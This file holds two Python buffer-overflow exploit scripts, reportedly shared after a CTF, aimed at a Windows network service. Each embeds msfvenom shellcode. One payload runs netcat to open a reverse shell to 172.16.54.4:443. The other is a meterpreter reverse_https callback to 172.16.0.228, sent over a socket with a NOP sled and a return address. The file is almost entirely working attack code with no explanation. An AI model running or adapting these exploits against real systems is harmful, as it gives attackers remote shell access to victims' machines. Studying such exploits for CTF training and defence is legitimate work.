# Other exploits that were publicly shared after the CTF

################################################################################################################################

import sys, socket, time

#247 bytes shellcode - msfvenom -p windows/exec CMD="nc64.exe 172.16.54.4 443 -e cmd.exe" -f python -b '\x00\xff'

buf =  ""
buf += "\xd9\xe5\xbb\x3a\xb9\x25\xe6\xd9\x74\x24\xf4\x5a\x31"
buf += "\xc9\xb1\x38\x31\x5a\x17\x03\x5a\x17\x83\xd0\x45\xc7"
buf += "\x13\xd8\x5e\x8a\xdc\x20\x9f\xeb\x55\xc5\xae\x2b\x01"
buf += "\x8e\x81\x9b\x41\xc2\x2d\x57\x07\xf6\xa6\x15\x80\xf9"
buf += "\x0f\x93\xf6\x34\x8f\x88\xcb\x57\x13\xd3\x1f\xb7\x2a"
buf += "\x1c\x52\xb6\x6b\x41\x9f\xea\x24\x0d\x32\x1a\x40\x5b"
buf += "\x8f\x91\x1a\x4d\x97\x46\xea\x6c\xb6\xd9\x60\x37\x18"
buf += "\xd8\xa5\x43\x11\xc2\xaa\x6e\xeb\x79\x18\x04\xea\xab"
buf += "\x50\xe5\x41\x92\x5c\x14\x9b\xd3\x5b\xc7\xee\x2d\x98"
buf += "\x7a\xe9\xea\xe2\xa0\x7c\xe8\x45\x22\x26\xd4\x74\xe7"
buf += "\xb1\x9f\x7b\x4c\xb5\xc7\x9f\x53\x1a\x7c\x9b\xd8\x9d"
buf += "\x52\x2d\x9a\xb9\x76\x75\x78\xa3\x2f\xd3\x2f\xdc\x2f"
buf += "\xbc\x90\x78\x24\x51\xc4\xf0\x67\x3c\x1b\x86\x12\x72"
buf += "\x1b\x98\x1c\x23\x74\xa9\x97\xac\x03\x36\x72\x89\xfc"
buf += "\x7c\xde\xb8\x94\xd8\x8b\xf8\xf8\xda\x66\x3e\x05\x59"
buf += "\x82\xbf\xf2\x41\xe7\xba\xbf\xc5\x14\xb7\xd0\xa3\x1a"
buf += "\x64\xd0\xe1\x74\xe9\x18\x3e\xa6\x88\x1c\x5b\x96\x63"
buf += "\xea\x91\xf8\xb2\x22\xf8\x31\x81\x64\x30\x19\xdd\x4c"
buf += "\x0b\x79\x30\xc8\x4b\x1a\x27\x76\xa2\xb9\xcf\x13\xba"

host = sys.argv[1] # Recieve IP from user
port = int(sys.argv[2]) # Recieve Port from user
length = 1000 - 247 # FÃ¼llzeichen - shell
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Declare a TCP socket
client.connect((host, port)) # Connect to user supplied port and IP address
payload =("\x90"*13 + buf + "B"*length + "\xec\x2c\x47\x10"*10)

client.send(payload) # Send the user command with a variable length name
client.close() # Close the Connection

################################################################################################################################

#!/usr/bin/env python

from pwn import *

context(os = "windows", arch = "i386")

# NOP sled
buf = "\x90" * 597

# msfvenom -p windows/meterpreter/reverse_https -b "\x00\x0a" -f py LHOST=172.16.0.228 LPORT=443
buf += "\xda\xcc\xd9\x74\x24\xf4\x5e\x33\xc9\xbf\xb0\xfc\x77"
buf += "\xae\xb1\x63\x31\x7e\x18\x03\x7e\x18\x83\xee\x4c\x1e"
buf += "\x82\x52\x44\x5d\x6d\xab\x94\x02\xe7\x4e\xa5\x02\x93"
buf += "\x1b\x95\xb2\xd7\x4e\x19\x38\xb5\x7a\xaa\x4c\x12\x8c"
buf += "\x1b\xfa\x44\xa3\x9c\x57\xb4\xa2\x1e\xaa\xe9\x04\x1f"
buf += "\x65\xfc\x45\x58\x98\x0d\x17\x31\xd6\xa0\x88\x36\xa2"
buf += "\x78\x22\x04\x22\xf9\xd7\xdc\x45\x28\x46\x57\x1c\xea"
buf += "\x68\xb4\x14\xa3\x72\xd9\x11\x7d\x08\x29\xed\x7c\xd8"
buf += "\x60\x0e\xd2\x25\x4d\xfd\x2a\x61\x69\x1e\x59\x9b\x8a"
buf += "\xa3\x5a\x58\xf1\x7f\xee\x7b\x51\x0b\x48\xa0\x60\xd8"
buf += "\x0f\x23\x6e\x95\x44\x6b\x72\x28\x88\x07\x8e\xa1\x2f"
buf += "\xc8\x07\xf1\x0b\xcc\x4c\xa1\x32\x55\x28\x04\x4a\x85"
buf += "\x93\xf9\xee\xcd\x39\xed\x82\x8f\x55\x9f\xf9\x5b\xa5"
buf += "\x37\x75\xcd\xcb\xae\x2d\x65\x5f\x46\xe8\x72\xa0\x7d"
buf += "\xc5\xa7\x0d\x2d\x75\x0b\xe2\xb9\x43\xfd\x7d\x9d\x4b"
buf += "\xd4\x2e\xb2\xd9\xd4\x83\x67\x76\x60\x22\x88\x86\x7e"
buf += "\x97\x88\x86\x7e\xf8\xed\xe9\x19\x56\xd9\xc6\x84\x3d"
buf += "\x77\x48\x0b\xb8\x38\xfc\xde\x0d\xb6\x63\x80\x10\x57"
buf += "\x35\x27\xea\xf5\xc7\xf4\x46\xa3\x17\xcb\x05\x12\x6f"
buf += "\x2b\xf9\xfc\xd8\xa2\x66\x3a\x19\x61\x11\x05\xb5\xe2"
buf += "\x21\xb8\xda\x77\x72\xef\x49\x2f\x27\x59\x06\x24\x92"
buf += "\x4b\xed\x45\xc9\x02\x7b\xb0\xae\x42\xfc\xf7\x50\x93"
buf += "\x75\x17\x3a\x97\xd5\xb2\xa5\xc1\xbd\x37\x9f\x73\xbb"
buf += "\x47\xca\xdf\x97\xe4\xa7\x89\x7f\x26\x41\x2e\xfb\xc7"
buf += "\x98\xcb\x3b\x42\x36\xbc\x33\xbe\x36\x3c\x2c\x85\xc6"
buf += "\x09\x4c\xfa\xf3\x3d\xf9\xc8\x13\x88\x01\xd3\xe3\x61"
buf += "\x42\xbb\xe3\x65\x42\x3b\x8b\x85\x42\x7b\x4b\xd5\x2a"
buf += "\x23\xef\x8a\x4f\x2c\x3a\xbf\xc3\x80\x4d\x27\xb4\x4e"
buf += "\x4d\x88\x3b\x8f\x1e\x9e\x53\x9d\x36\x97\x46\x5e\xe3"
buf += "\x2d\x46\xd5\xc4\xa5\x40\x17\x19\x3c\x8e\x62\x78\x67"
buf += "\xcc\xd2\x6a\xf3\x2d\x13\x95\x35\xe5\xde\x47\x07\x3f"
buf += "\x31\xa7\x49\x0d\x7f\xff\x95\xca\x8f\x4a\x37\x7a\x1a"
buf += "\xb4\x6b\x7c\x0f"

# 0x10472ca7 : add esp, 0x14 ; ret
buf += p32(0x10472ca7)

conn = remote("172.16.0.230", 4444)
conn.send(buf)
conn.close()